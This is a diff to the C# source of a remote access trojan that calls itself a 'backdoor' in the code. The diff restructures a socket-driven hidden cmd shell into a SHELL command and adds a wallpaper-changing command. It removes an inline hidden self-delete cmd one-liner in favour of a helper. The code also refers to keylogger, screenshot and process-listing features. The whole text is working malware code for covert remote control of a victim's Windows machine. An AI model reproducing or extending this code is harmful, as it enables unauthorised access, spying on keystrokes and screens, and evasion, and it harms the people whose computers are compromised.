@@ -15,12 +15,8 @@ namespace RAT
     {
         TcpListener Listener;
         Socket Socket;
-        Process Shell;
-        StreamReader FromShell;
-        StreamWriter ToShell;
         StreamReader InStream;
         StreamWriter OutStream;
-        Thread ShellReaderThread;
         Thread KeyloggerThread;
         KeyLogger Keylogger;
 
@@ -67,8 +63,11 @@ namespace RAT
                 }
                 if (Verbose) Log("Password Accepted.");
 
+                // welcome message
+                OutStream.WriteLine(StringExtensions.AlignCenter(String.Format("  Welcome to {0} RAT  ", Name), 80, '='));
+                OutStream.WriteLine(StringExtensions.AlignCenter("  SINGLE-USER MODE  ", 80, '='));
 
-                StartShell();
+                InputLoop();
             }
             catch (Exception e)
             {
@@ -77,52 +76,8 @@ namespace RAT
             }
             finally
             {
-                CloseShell();
+                DropConnection();
             }
-        }
-
-        void StartShell()
-        {
-            Shell = new Process();
-            ProcessStartInfo p = new ProcessStartInfo("cmd")
-            {
-                CreateNoWindow = true,
-                UseShellExecute = false,
-                RedirectStandardError = true,
-                RedirectStandardInput = true,
-                RedirectStandardOutput = true
-            };
-            Shell.StartInfo = p;
-            Shell.Start();
-
-            ToShell = Shell.StandardInput;
-            FromShell = Shell.StandardOutput;
-            ToShell.AutoFlush = true;
-
-            // start sending output to the user
-            ShellReaderThread = new Thread(new ThreadStart(SendShellOutput));
-            ShellReaderThread.Start();
-
-            // welcome message
-            OutStream.WriteLine(StringExtensions.AlignCenter(String.Format("  Welcome to {0} RAT  ", Name), 80, '='));
-            OutStream.WriteLine(StringExtensions.AlignCenter("  SINGLE-USER MODE  ", 80, '='));
-
-            InputLoop();
-        }
-
-        void SendShellOutput()
-        {
-            string buffer = "";
-            while ((buffer = FromShell.ReadLine()) != null)
-            {
-                OutStream.WriteLine(buffer + "\r");
-
-                // temporary, for logging
-                Console.ForegroundColor = ConsoleColor.Cyan;
-                Log(buffer);
-                Console.ResetColor();
-            }
-            CloseShell();
         }
 
         void InputLoop()
@@ -139,6 +94,75 @@ namespace RAT
         {
             switch (command)
             {
+                case RatAction.SHELL:
+                    Process ShellProc = new Process();
+                    ProcessStartInfo pInfo = new ProcessStartInfo("cmd")
+                    {
+                        CreateNoWindow = true,
+                        UseShellExecute = false,
+                        RedirectStandardError = true,
+                        RedirectStandardInput = true,
+                        RedirectStandardOutput = true
+                    };
+                    ShellProc.StartInfo = pInfo;
+
+                    Thread ShellReaderThread = null;
+                    StreamWriter ToShell = null;
+                    StreamReader FromShell = null;
+                    try
+                    {
+                        ShellProc.Start();
+                        ToShell = ShellProc.StandardInput;
+                        FromShell = ShellProc.StandardOutput;
+                        ToShell.AutoFlush = true;
+
+                        // start sending output to the user
+                        ShellReaderThread = new Thread(delegate ()
+                       {
+                           string shellOutBuffer = "";
+                           while ((shellOutBuffer = FromShell.ReadLine()) != null)
+                           {
+                               OutStream.WriteLine(shellOutBuffer + "\r");
+
+                               // temporary, for logging
+                               Console.ForegroundColor = ConsoleColor.Cyan;
+                               Log(shellOutBuffer);
+                               Console.ResetColor();
+                           }
+                           DropConnection();
+                       });
+                        ShellReaderThread.Start();
+                        string buffer = "";
+                        while (((buffer = InStream.ReadLine()) != null) && buffer != "q" && buffer != "exit")
+                        {
+                            ToShell.WriteLine(buffer + "\r\n");
+                        }
+
+                    }
+                    catch (Exception e)
+                    {
+                        OutStream.WriteLine(e);
+                        Log(e.ToString());
+                    }
+                    finally
+                    {
+                        if (ShellProc != null)
+                        {
+                            ShellProc.Close();
+                            ShellProc.Dispose();
+                        }
+                        if (ShellReaderThread != null)
+                        {
+                            ShellReaderThread.Abort();
+                            ShellReaderThread = null;
+                        }
+                        if (ToShell != null) ToShell.Dispose();
+                        if (FromShell != null) FromShell.Dispose();
+                        if (ShellProc != null) ShellProc.Dispose();
+                        OutStream.WriteLine("==== Shell exited! ====");
+                        if (Verbose) Log("Shell exit");
+                    }
+                    break;
                 case RatAction.SCREENSHOT:
                     if (Verbose) OutStream.WriteLine("Taking a screenshot...");
                     string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "ppppp.png");
@@ -216,22 +240,15 @@ namespace RAT
                     break;
                 case RatAction.SELF_DELETE:
                     OutStream.WriteLine("Are you sure, that you want to delete the backdoor? [Y/N]");
-                    var yORn = InStream.ReadLine();
-                    if (yORn.Equals("y"))
+                    var question = InStream.ReadLine();
+                    if (question.Equals("y"))
                     {
                         Log("Performing self-deletion");
                         OutStream.WriteLine("Goodbye my friend!");
-                        ProcessStartInfo Info = new ProcessStartInfo();
-                        Info.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " +
-                                       Application.ExecutablePath;
-                        Info.WindowStyle = ProcessWindowStyle.Hidden;
-                        Info.CreateNoWindow = true;
-                        Info.FileName = "cmd";
-                        Process.Start(Info);
-                        CloseShell();
+                        WindowsHelper.SelfDelete();
+                        DropConnection();
                         Environment.Exit(0);
                     }
-
                     break;
                 case RatAction.LIST_PROCESSES:
                     Log("LIST_PROCESSES MODE");
@@ -241,12 +258,27 @@ namespace RAT
                         OutStream.WriteLine("#{0} \t{1} ", process.Id, process.ProcessName);
                     }
                     break;
+                case RatAction.CHANGE_WALLPAPER:
+                    OutStream.WriteLine("Enter the uri of new wallpaper:");
+                    var uri = InStream.ReadLine();
+                    try
+                    {
+                        WindowsHelper.Wallpaper.SetTo(new Uri(uri), WindowsHelper.Wallpaper.Style.Centered);
+                        OutStream.WriteLine("\r\nWallpaper set!");
+                        Log("Wallpaper set!");
+                    }
+                    catch (Exception e)
+                    {
+                        OutStream.WriteLine("Some error when setting wallpaper:\r\n" + e);
+                        Log("<ERROR> when setting wallpaper:" + e);
+                    }
+                    break;
                 case RatAction.QUIT:
                     OutStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
-                    CloseShell();
+                    DropConnection();
                     break;
                 default:
-                    ToShell.WriteLine(command + "\r\n");
+                    OutStream.WriteLine("no such command. Try help commandfor more info");
                     break;
             }
         }
@@ -282,7 +314,6 @@ namespace RAT
             OutStream.Dispose();
             Socket.Close();
             Listener.Stop();
-            // Console.Beep(382, 500);
         }
 
         string GenerateNLineBreaks(int n)
@@ -294,30 +325,6 @@ namespace RAT
                 sb.Append("\r\n");
             }
             return sb.ToString();
-        }
-
-        public void CloseShell()
-        {
-            try
-            {
-                if (Verbose) Log("Closing shell process");
-                if (Shell != null)
-                {
-                    Shell.Close();
-                    Shell.Dispose();
-                }
-                if (ShellReaderThread != null)
-                {
-                    ShellReaderThread.Abort();
-                    ShellReaderThread = null;
-                }
-                ToShell.Dispose();
-                FromShell.Dispose();
-                Shell.Dispose();
-
-                DropConnection();
-            }
-            catch (Exception) { }
         }
 
         void Log(string message)
